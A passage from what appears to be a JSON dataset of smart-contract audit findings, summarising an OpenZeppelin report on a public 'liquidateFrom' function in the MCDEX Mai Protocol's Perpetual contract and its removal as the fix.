`internal` visibility.\n\n\n**Update:** *Fixed. The `liquidateFrom` function has been removed.*",
      "summary": "\nThis bug report is about a contract called `Perpetual`, which has a public function called `liquidateFrom`. This function allows users to liquidate a position when the contract is in the `SETTLED` state, and also allows users to set an arbitrary `from` address, potentially allowing a third-party user to confiscate the position of an under-collateralized trader. It also has the potential to break some of the Automated Market Maker invariants, like the condition that it only holds `LONG` positions. \n\nThe solution proposed was to restrict the `liquidateFrom` function to `internal` visibility. This issue has now been fixed, and the `liquidateFrom` function has been removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}